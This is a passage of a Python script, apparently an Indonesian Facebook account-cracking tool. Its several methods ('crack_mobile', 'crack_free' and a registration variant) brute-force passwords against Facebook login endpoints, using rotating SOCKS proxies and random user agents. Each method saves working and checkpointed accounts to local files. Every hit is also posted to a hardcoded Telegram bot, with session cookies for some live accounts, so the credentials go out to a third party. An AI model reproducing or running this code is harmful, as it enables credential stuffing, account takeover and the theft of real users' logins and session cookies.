'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v17.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'AWXKmsgRpwOFX1K4ZoNDbmP','x-fb-trace-id': 'BynOr6cFaF2','x-fb-rev': '1008438023','x-fb-debug': 'EPIqoc9+ghyL5Hx0AnpfvNtBHYl9/Ei6sTW0kT7wSzz8OJ1npo3d4pvPZxLh8M9VV4ZjvV5Ucl6103Mn6qIr/Q==','content-length': '386','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="115", "Not=A?Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=588405863272511&kid_directed_site=0&app_id=588405863272511&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D588405863272511%26redirect_uri%3Dhttps%253A%252F%252Fwww.primeopinion.com%252Fauth%252Fsocial%253Fprovider%253Dfacebook%26scope%3Demail%26response_type%3Dcode%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D21079cbf-2bba-46bf-9b0d-955ae9276b8c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.primeopinion.com%2Fauth%2Fsocial%3Fprovider%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'en-GB,en;q=0.9,id-ID;q=0.8,id;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=588405863272511&kid_directed_site=0&app_id=588405863272511&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D588405863272511%26redirect_uri%3Dhttps%253A%252F%252Fwww.primeopinion.com%252Fauth%252Fsocial%253Fprovider%253Dfacebook%26scope%3Demail%26response_type%3Dcode%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D21079cbf-2bba-46bf-9b0d-955ae9276b8c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.primeopinion.com%2Fauth%2Fsocial%3Fprovider%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}* {M}═════➤ {K}{idf}|{pw}{O} {U}<//> {O}{tahun(idf)}{N}\n')
				requests.post(f"https://api.telegram.org/bot5695456247:AAFgZEqPtzdjK6U6Al4EuTW0v_vL89eyG5g/sendMessage?chat_id=5236256739&text=Cp-Reg {idf}|{pw}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}* {O}═════➤ {H}{idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n{O} ╚═➤{B}{kuki}\n{O}   ╚═══➤{DG}{ua}{N}\n')
				requests.post(f"https://api.telegram.org/bot5695456247:AAFgZEqPtzdjK6U6Al4EuTW0v_vL89eyG5g/sendMessage?chat_id=5236256739&text=LIVE-Reg {idf}|{pw}\n╚═➤ {kuki}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------[ METODE-MOBILE VALIDATE]--------#
def crack_mobile(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[cyan]𝗧𝗔𝗛𝗘𝗗𝗘[/] [deep_white]{(loop)}/{len(id)}[/] [bold green]😘𝗢𝗞[/]:[bold green]{(ok)} [/]=[bold yellow] 😂𝗖𝗣[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'en-GB,en;q=0.9,id-ID;q=0.8,id;q=0.7,en-US;q=0.6'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=213560439114&kid_directed_site=0&app_id=213560439114&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1693928804651%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb7d90e352be58%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1d22f87b0d9ef4%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df274e09cbba663%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3ad5b79eb2cbbc%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1d22f87b0d9ef4%2526relation%253Dopener%2526frame%253Df1051fadbc110e8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3ad5b79eb2cbbc%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1d22f87b0d9ef4%26relation%3Dopener%26frame%3Df1051fadbc110e8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&rtime=1693928805&hrc=1&wtsid=rdr_0CIdNDzNJDFNOpibT&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6IjNjZjk4NjI5MjM4ZDRmZWM5MGQwZGQ2YmY1NDAxY2MwIn0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6596dcfe-057c-459d-bdf4-f8491ff1a1ae%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6IjNjZjk4NjI5MjM4ZDRmZWM5MGQwZGQ2YmY1NDAxY2MwIn0%253D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en;q=0.9,id-ID;q=0.8,id;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}* {M}═════➤ {K}{idf}|{pw}{O} {U}<//> {O}{tahun(idf)}{N}\n')
				requests.post(f"https://api.telegram.org/bot5695456247:AAFgZEqPtzdjK6U6Al4EuTW0v_vL89eyG5g/sendMessage?chat_id=5236256739&text=Cp-M-Vldt {idf}|{pw}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}* {O}═════➤ {H}{idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n{O} ╚═➤{B}{kuki}\n{O}   ╚═══➤{DG}{ua}{N}\n')
				requests.post(f"https://api.telegram.org/bot5695456247:AAFgZEqPtzdjK6U6Al4EuTW0v_vL89eyG5g/sendMessage?chat_id=5236256739&text=LIVE-M.vldt {idf}|{pw}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE-FREE ]-----------------#
def crack_free(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys(): 
				print(f'\r{K}>> {idf}|{pw}{N}')
				requests.post(f"https://api.telegram.org/bot5695456247:AAFgZEqPtzdjK6U6Al4EuTW0v_vL89eyG5g/sendMessage?chat_id=5236256739&text=Cp-Free {idf}|{pw}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
				requests.post(f"https://api.telegram.org/bot5695456247:AAFgZEqPtzdjK6U6Al4EuTW0v_vL89eyG5g/sendMessage?chat_id=5236256739&text=LIVE-Free {idf}|{pw}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/Fikram_XD')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	FIKRAMGANTENG(f'\n{m}——> {h}SCRIPT INI FREE TIDAK UNTUK DIPERJUAL BELIKAN\n{m}——> {h}JIKA TERJADI BUG ATAU ERROR SILAHKAN HUB : wa me/6285824034302\n{m}——> {h}TERIMA KASIH BANG FIK SUDAH MAU BERBAGI\n{m}——> {h}SEMOGA DI PERMUDAHKAN JALAN REZEKINYA AMIIN\n{m}——> {h}DAN SEMOGA DAPET BANYAK HASIL OK NYA{x}')
	time.sleep(6)
	login() 
	
#--RECODE BY MOHAMMAD FIKRAM XD--#
#--Author Alvino Adijaya-#
#--------THANKS TO ALVINO--------#